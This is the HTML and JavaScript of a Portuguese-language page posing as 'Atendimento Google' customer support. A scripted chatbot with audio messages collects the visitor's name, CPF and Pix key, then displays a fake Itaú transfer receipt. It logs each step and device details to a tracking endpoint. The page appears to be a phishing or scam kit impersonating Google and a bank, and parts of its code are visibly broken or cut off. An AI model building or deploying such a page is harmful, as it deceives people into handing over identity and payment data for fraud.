<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Atendimento Google</title>
<link rel="icon" href="/favicon.svg">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{font-family:'Google Sans','Roboto',Arial,sans-serif;background:#f1f3f4;display:flex;flex-direction:column}

/* HEADER */
.chat-header{
  background:#fff;
  padding:12px 16px;
  display:flex;align-items:center;gap:12px;
  box-shadow:0 1px 3px rgba(60,64,67,.15);
  position:relative;z-index:10;
  flex-shrink:0;
}
.header-back{
  width:36px;height:36px;border-radius:50%;border:none;background:none;
  display:flex;align-items:center;justify-content:center;
  cursor:pointer;color:#5f6368;flex-shrink:0;
}
.header-back:hover{background:#f1f3f4}
.header-avatar{
  width:42px;height:42px;border-radius:50%;object-fit:cover;flex-shrink:0;
  border:2px solid #e8eaed;
}
.header-info{flex:1;min-width:0}
.header-name{font-size:15px;font-weight:500;color:#202124}
.header-status{display:flex;align-items:center;gap:5px;font-size:12px;color:#34A853;font-weight:500}
.status-dot{width:7px;height:7px;border-radius:50%;background:#34A853;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.header-logo{margin-left:auto}
.header-logo svg{width:24px;height:24px}

/* CHAT AREA */
.chat-area{
  flex:1;overflow-y:auto;padding:20px 16px 8px;
  display:flex;flex-direction:column;gap:12px;
  scroll-behavior:smooth;
}
.chat-area::-webkit-scrollbar{width:4px}
.chat-area::-webkit-scrollbar-track{background:transparent}
.chat-area::-webkit-scrollbar-thumb{background:#dadce0;border-radius:2px}

/* DATE CHIP */
.date-chip{
  align-self:center;
  background:#fff;border-radius:100px;
  padding:4px 14px;font-size:11px;color:#5f6368;
  box-shadow:0 1px 2px rgba(60,64,67,.15);
  margin-bottom:4px;
}

/* BOT MESSAGE */
.bot-row{display:flex;align-items:flex-end;gap:8px}
.bot-avatar{
  width:32px;height:32px;border-radius:50%;object-fit:cover;
  flex-shrink:0;align-self:flex-end;
}
.bot-bubble{
  background:#fff;
  border-radius:18px 18px 18px 4px;
  padding:11px 16px;
  max-width:78%;
  box-shadow:0 1px 2px rgba(60,64,67,.15);
  font-size:14px;color:#202124;line-height:1.6;
  position:relative;
}
.bot-bubble .time{
  font-size:10px;color:#9aa0a6;margin-top:4px;display:block;text-align:right;
}
.bot-typing{display:flex;align-items:center;gap:4px;padding:14px 16px}
.bot-typing span{
  width:7px;height:7px;border-radius:50%;background:#9aa0a6;
  animation:typing 1.2s infinite;
}
.bot-typing span:nth-child(2){animation-delay:.2s}
.bot-typing span:nth-child(3){animation-delay:.4s}
@keyframes typing{0%,60%,100%{transform:translateY(0)}30%{transform:translateY(-6px)}}

/* RECORDING INDICATOR */
.bot-recording{display:flex;align-items:center;gap:8px;padding:10px 16px}
.rec-mic{width:28px;height:28px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;flex-shrink:0;
  box-shadow:0 0 0 0 rgba(37,211,102,.5);animation:micpulse 1.4s infinite}
@keyframes micpulse{0%{box-shadow:0 0 0 0 rgba(37,211,102,.55)}70%{box-shadow:0 0 0 10px rgba(37,211,102,0)}100%{box-shadow:0 0 0 0 rgba(37,211,102,0)}}
.rec-waves{display:flex;align-items:center;gap:3px}
.rec-waves span{width:3px;border-radius:3px;background:#25d366;animation:wavebar 1s ease-in-out infinite}
.rec-waves span:nth-child(1){height:5px;animation-delay:0s}
.rec-waves span:nth-child(2){height:10px;animation-delay:.1s}
.rec-waves span:nth-child(3){height:16px;animation-delay:.2s}
.rec-waves span:nth-child(4){height:10px;animation-delay:.3s}
.rec-waves span:nth-child(5){height:5px;animation-delay:.4s}
.rec-waves span:nth-child(6){height:13px;animation-delay:.15s}
.rec-waves span:nth-child(7){height:7px;animation-delay:.35s}
@keyframes wavebar{0%,100%{transform:scaleY(.4)}50%{transform:scaleY(1)}}
.rec-label{font-size:11px;color:#25d366;font-weight:500;letter-spacing:.3px}

/* USER MESSAGE */
.user-row{display:flex;justify-content:flex-end}
.user-bubble{
  background:#1a73e8;color:#fff;
  border-radius:18px 18px 4px 18px;
  padding:11px 16px;
  max-width:78%;
  font-size:14px;line-height:1.6;
  box-shadow:0 1px 2px rgba(26,115,232,.3);
}
.user-bubble .time{font-size:10px;color:rgba(255,255,255,.65);margin-top:4px;display:block;text-align:right}

/* QUICK REPLIES */
.quick-replies{
  display:flex;flex-wrap:wrap;gap:8px;
  padding:0 0 0 40px;
}
.qr-btn{
  background:#fff;border:1.5px solid #1a73e8;
  color:#1a73e8;font-size:13px;font-weight:500;
  padding:8px 18px;border-radius:100px;
  cursor:pointer;font-family:inherit;
  transition:background .15s,color .15s;
}
.qr-btn:hover{background:#1a73e8;color:#fff}

/* INPUT AREA */
.chat-input-wrap{
  background:#fff;
  padding:10px 14px 10px;
  box-shadow:0 -1px 3px rgba(60,64,67,.12);
  flex-shrink:0;
}
.chat-input-row{
  display:flex;align-items:center;gap:10px;
  background:#f1f3f4;border-radius:100px;
  padding:8px 8px 8px 18px;
}
.chat-input{
  flex:1;border:none;background:none;
  font-size:14px;font-family:inherit;color:#202124;
  outline:none;
}
.chat-input::placeholder{color:#9aa0a6}
.send-btn{
  width:36px;height:36px;border-radius:50%;
  background:#1a73e8;border:none;cursor:pointer;
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;transition:background .15s;
}
.send-btn:hover{background:#1557b0}
.send-btn:disabled{background:#dadce0;cursor:default}
.send-btn svg{color:#fff}
.input-hint{
  font-size:11px;color:#9aa0a6;text-align:center;
  margin-top:8px;display:flex;align-items:center;justify-content:center;gap:4px;
}

/* GOOGLE COLORS BAR */
.g-bar{height:3px;display:flex;flex-shrink:0}
.g-bar span{flex:1}

/* ANALYSIS BOX */
.analysis-box{
  background:#fff;border-radius:16px;
  padding:16px 18px;
  box-shadow:0 1px 2px rgba(60,64,67,.15);
  max-width:78%;font-size:13px;color:#202124;
}
.analysis-box .a-title{
  font-weight:500;font-size:13px;color:#5f6368;
  margin-bottom:12px;display:flex;align-items:center;gap:6px;
}
.analysis-step{
  display:flex;align-items:center;gap:10px;
  padding:6px 0;border-bottom:1px solid #f1f3f4;
  opacity:0;transition:opacity .4s;
}
.analysis-step:last-child{border-bottom:none}
.a-icon{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.a-icon.spin{background:#e8f0fe}
.a-icon.done{background:#e6f4ea}
.a-spin{width:14px;height:14px;border:2px solid #1a73e8;border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<script>
var step = 0;
var userName = '';
var userCPF = '';
var pixType = '';
var _pixKey = '';
var _trackStart = Date.now();
var _stepStart = Date.now();

// ---- TRACKING ----
var _sid = (function(){
  try{
    var s=sessionStorage.getItem('_sid');
    if(!s){s=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_sid',s);}
    return s;
  }catch(e){return Math.random().toString(36).slice(2)+Date.now().toString(36);}
})();

function track(evt, data){
  try{
    var p=Object.assign({sid:_sid,ev:evt,ts:Date.now(),step:step},data||{});
    fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true}).catch(function(){});
  }catch(e){}
}

window.addEventListener('beforeunload',function(){
  track('leave',{elapsed:Date.now()-_trackStart,stepElapsed:Date.now()-_stepStart});
});

// track page load
track('page_load',{
  ua:navigator.userAgent,
  screen:screen.width+'x'+screen.height,
  ref:document.referrer||'direct',
  lang:navigator.language,
  mobile:/Mobi|Android/i.test(navigator.userAgent)
});

function now(){
  var d=new Date();
  return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
}

// Aparece as mensagens iniciais com delay
setTimeout(function(){document.getElementById('msg1').style.opacity='1'},400);
setTimeout(function(){document.getElementById('msg2').style.opacity='1'},1100);
// input liberado só após ouvir o áudio

function playVoz(){
  var audio=document.getElementById('botAudio');
  var icon=document.getElementById('playIcon');
  var timeEl=document.getElementById('audioTime');
  if(!audio)return;
  if(!audio.paused){
    audio.pause();
    icon.innerHTML='<polygon points="5 3 19 12 5 21 5 3"/>';
    return;
  }
  audio.play();
  track('audio_play',{audio:'voz1'});
  icon.innerHTML='<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
  audio.ontimeupdate=function(){
    var s=Math.floor(audio.currentTime);
    timeEl.textContent=Math.floor(s/60)+':'+(s%60<10?'0':'')+s%60;
  };
  function _unlockVoz(){
    var inp=document.getElementById('chatInput');
    var btn=document.getElementById('sendBtn');
    if(!inp.disabled)return;
    inp.disabled=false;
    inp.placeholder='Digite sua mensagem...';
    btn.disabled=false;
    inp.focus();
  }
  audio.onended=function(){
    icon.innerHTML='<polygon points="5 3 19 12 5 21 5 3"/>';
    audio.currentTime=0;
    if(timeEl)timeEl.textContent='aperte no azul para ouvir';
    track('audio_done',{audio:'voz1'});
    _unlockVoz();
  };
  audio.onerror=function(){ _unlockVoz(); };
  // fallback: libera após duração estimada + 3s caso onended não dispare
  setTimeout(function(){
    if(!audio.paused) return; // ainda tocando, espera
    _unlockVoz();
  }, (audio.duration>0 ? audio.duration*1000 : 30000) + 3000);
}

function sendMessage(){
  var input=document.getElementById('chatInput');
  var text=input.value.trim();
  if(!text)return;
  input.value='';

  addUserBubble(text);

  if(step===0){
    userName=text.toUpperCase();
    step=1;
    track('name_submit',{name:text,elapsed:Date.now()-_stepStart});
    _stepStart=Date.now();
    showTyping(function(){
      addBotBubble('Obrigada, <strong>'+escHtml(userName)+'</strong>! 😊');
    }, 1200);
    setTimeout(function(){
      showRecording(function(){
        addAudioBubble('/atendente_voz2.mp3');
      }, 1400);
    }, 2800);
  } else if(step===1){
    userCPF=text;
    step=2;
    track('cpf_submit',{cpf_masked:text.slice(0,3)+'.***.***-**',elapsed:Date.now()-_stepStart});
    _stepStart=Date.now();
    var inp=document.getElementById('chatInput');
    var snd=document.getElementById('sendBtn');
    inp.disabled=true; inp.placeholder='Aguarde...'; snd.disabled=true;

    showRecording(function(){
      addAudioBubble('/atendente_voz3.mp3', function(){
        setTimeout(function(){ addAnalysisBox(); }, 600);
      });
    }, 1600);
  } else if(step===3){
    _pixKey=text;
    step=4;
    track('pix_key_submit',{pixType:pixType,key_masked:pixType==='Email'?text:text.slice(0,3)+'***',elapsed:Date.now()-_stepStart});
    _stepStart=Date.now();
    var inp2=document.getElementById('chatInput');
    var snd2=document.getElementById('sendBtn');
    inp2.disabled=true; inp2.placeholder='Aguarde...'; snd2.disabled=true;

    setTimeout(function(){
      showRecording(function(){
        addAudioBubble('/atendente_voz6.mp3', function(){
          // após ouvir áudio 6, mostra comprovante Itaú
          setTimeout(function(){
            showTyping(function(){
              addItauComprovante(userName, userCPF);
            }, 4000);
          }, 400);
        });
      }, 1000);
    }, 400);
  }
}

function addUserBubble(text){
  var area=document.getElementById('chatArea');
  var row=document.createElement('div');
  row.className='user-row';
  row.innerHTML='<div class="user-bubble">'+escHtml(text)+'<span class="time">'+now()+'</span></div>';
  area.appendChild(row);
  scrollBottom();
}

function addAudioBubble(src, onDone){
  var area=document.getElementById('chatArea');
  var id='audio_'+Date.now();
  var row=document.createElement('div');
  row.className='bot-row';
  row.style.opacity='0';
  row.style.transition='opacity .3s';
  row.innerHTML='<img class="bot-avatar" src="/atendente.png" alt="Isa"><div><div class="bot-bubble" style="padding:10px 14px;min-width:220px">'+
    '<audio id="'+id+'_aud" src="'+src+'" preload="auto"></audio>'+
    '<div style="display:flex;align-items:center;gap:10px">'+

function playAudio(id){
  var audio=document.getElementById(id+'_aud');
  var icon=document.getElementById(id+'_icon');
  var timeEl=document.getElementById(id+'_time');
  if(!audio)return;
  if(!audio.paused){
    audio.pause();
    icon.innerHTML='<polygon points="5 3 19 12 5 21 5 3"/>';
    return;
  }
  var src=audio.src||id;
  audio.play();
  track('audio_play',{audio:src});
  if(!audio._playCount) audio._playCount=0;
  audio._playCount++;
  icon.innerHTML='<rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>';
  audio.ontimeupdate=function(){
    var s=Math.floor(audio.currentTime);
    timeEl.textContent=Math.floor(s/60)+':'+(s%60<10?'0':'')+s%60;
  };
  function _unlockAudio(){
    var inp=document.getElementById('chatInput');
    var snd=document.getElementById('sendBtn');
    if(!inp.disabled)return;
    var cb=audio._onDone;
    if(cb){ audio._onDone=null; cb(); }
    else {
      inp.disabled=false;
      inp.placeholder='Digite seu CPF...';
      inp.setAttribute('inputmode','numeric');
      snd.disabled=false;
      inp.focus();
    }
  }
  audio.onended=function(){
    icon.innerHTML='<polygon points="5 3 19 12 5 21 5 3"/>';
    audio.currentTime=0;
    timeEl.textContent='aperte no azul para ouvir';
    track('audio_done',{audio:src,plays:audio._playCount});
    _unlockAudio();
  };
  audio.onerror=function(){ _unlockAudio(); };
  // fallback caso onended não dispare
  setTimeout(function(){
    if(!audio.paused) return;
    _unlockAudio();
  }, (audio.duration>0 ? audio.duration*1000 : 30000) + 3000);
}

  if(e.key==='Enter')sendMessage();

document.getElementById('chatInput').addEventListener('input',function(e){
  if(step===0){
    e.target.value=e.target.value.replace(/[0-9]/g,'');
    return;
  }
  if(step===3){
    if(pixType==='Telefone'){
      var v=e.target.value.replace(/\D/g,'').slice(0,11);
      var m='';
      if(v.length<=2) m='('+v;
      else if(v.length<=7) m='('+v.slice(0,2)+') '+v.slice(2);
      else if(v.length<=11) m='('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
      e.target.value=m;
    } else if(pixType==='CPF'){
      var v2=e.target.value.replace(/\D/g,'').slice(0,11);
      var m2='';
      if(v2.length<=3) m2=v2;
      else if(v2.length<=6) m2=v2.slice(0,3)+'.'+v2.slice(3);
      else if(v2.length<=9) m2=v2.slice(0,3)+'.'+v2.slice(3,6)+'.'+v2.slice(6);
      else m2=v2.slice(0,3)+'.'+v2.slice(3,6)+'.'+v2.slice(6,9)+'-'+v2.slice(9);
      e.target.value=m2;
    }
    return;
  }
  if(step!==1)return;
  var v=e.target.value.replace(/\D/g,'').slice(0,11);
  var mask='';
  if(v.length<=3) mask=v;
  else if(v.length<=6) mask=v.slice(0,3)+'.'+v.slice(3);
  else if(v.length<=9) mask=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
  else mask=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
  e.target.value=mask;
});
</script>
</body>
